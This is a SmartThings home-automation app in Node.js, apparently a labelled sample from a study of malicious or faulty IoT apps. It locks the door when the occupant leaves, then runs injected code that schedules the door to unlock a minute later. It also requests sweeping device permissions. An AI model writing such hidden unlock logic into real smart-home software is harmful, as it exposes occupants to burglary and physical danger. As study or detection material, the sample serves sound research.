
// desc : Potential safety problem by invoking a wrong method

//Door  App  3003
const express = require('express');
const SmartApp = require('@smartthings/smartapp');
const server = module.exports = express();
server.use(express.json());

const axios = require('axios');

const app = new SmartApp();

/* Only here for Glitch, so that GET doesn't return an error */
server.get('/', (req, res) => {
  res.send('desc : Potential safety problem by invoking a wrong method');
});

/* Handles lifecycle events from SmartThings */
server.post('/', async (req, res) => {
    console.log(JSON.stringify(req.body, null, 2));
    app.handleHttpCallback(req, res);
});

app.enableEventLogging(2)      // logs requests and responses as pretty-printed JSON
    .appId("cfb12fc8-41a6-4aea-af3d-efc6b795db02")
    .permissions(['r:locations:*','w:locations:*','x:locations:*','r:devices:*', 'x:devices:*','w:devices:*'])
    .page('mainPage', (context, page, configData) => {
    	page.section('safety', section => {
            // use a switch instead of a real sensor
            section.deviceSetting('presenceSensor').capabilities(['switch']).required(true).multiple(true).permissions('rwx');
            section.deviceSetting('light').capabilities(['switchLevel']).required(true).multiple(true).permissions('rwx');
            section.deviceSetting('lock').capabilities(['lock']).required(true).multiple(true).permissions('rwx');
        });
    })

    .updated(async (context, updateData) => {
        await context.api.subscriptions.delete()
        await context.api.subscriptions.subscribeToDevices(context.config.presenceSensor, 'switch', 'switch', 'presenceSensorHandler')
        // await context.api.subscriptions.subscribeToDevices(context.config.alarm, 'alarm', 'alarm', 'alarmHandler')
    })

    // Called for both INSTALLED and UPDATED lifecycle events if there is no separate installed() handler
    .subscribedEventHandler('presenceSensorHandler', async (context, event) => {
        if (event.value ==='on'){
            let homeModeId = '';
            const modeList = await context.api.modes.list();
            modeList.forEach(element => {
                if (element.name === 'Home') {
                    homeModeId = element.id;
                }
            });
            await context.api.modes.setCurrent(homeModeId, event.locationId)
            await context.api.devices.sendCommands(context.config.light, 'switchLevel', 'setLevel', [80]);
        }
        else {
            await context.api.devices.sendCommands(context.config.light, 'switchLevel', 'setLevel', [0]);
            await context.api.devices.sendCommands(context.config.lock, 'lock', 'lock');
            await runScheduler(context, 1 , 'turnOnlightAndUnlockDoor')// code injected.

        }
    })


    .scheduledEventHandler('turnOnlightAndUnlockDoor', async (context, event) => {
        await context.api.devices.sendCommands(context.config.light, 'switchLevel', 'setLevel', [20]); // turn on instead of changing internsity
        await context.api.devices.sendCommands(context.config.lock, 'lock', 'unlock');
    })


    async function runScheduler(context, delayTime, schedulerName){
        const delay = delayTime; // delay in minutes (1000 * 60 is one minute)
        await context.api.schedules.runIn(schedulerName, delay);
    }


let port = process.env.PORT || 8724;
server.listen(port);
console.log(`Listening: http://127.0.0.1:${port}`);
